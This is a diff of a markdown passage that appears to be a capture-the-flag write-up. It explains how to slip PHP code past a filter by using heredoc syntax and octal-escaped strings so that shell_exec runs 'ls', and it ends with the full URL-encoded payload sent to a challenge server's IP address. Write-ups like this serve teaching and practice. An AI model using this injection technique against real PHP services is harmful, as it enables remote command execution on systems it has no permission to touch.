@@ -30,11 +30,11 @@ It will be difficult to work with both the parenthesis here as well as the singl
 Heredoc essentialy allows to express double quotes with the characters `<<<`, some header character (I chose{% raw %} _{% endraw %}), and some newlines. I then formed this:
 ```
 (<<<_
- shell_exec)
- _
- (<<<_
- ls)
- _
+shell_exec)
+_
+(<<<_
+ls)
+_
 ```
 Of course, strings are not allowed, but in PHP, we can encode them by using the escape character and converting them into octal values. `shell_exec` converts to `/163/150/145/154/154/137/145/170/145/143`, and `ls` converts to `/154/163`. To make a valid get request, I url encoded the converted numbers and got this final payload: `http://45.129.40.107:9668/?formula=(%3C%3C%3C_%0A%5C163%5C150%5C145%5C154%5C154%5C137%5C145%5C170%5C145%5C143%0A_)(%3C%3C%3C_%0A%5C154%5C163%0A_)`
 
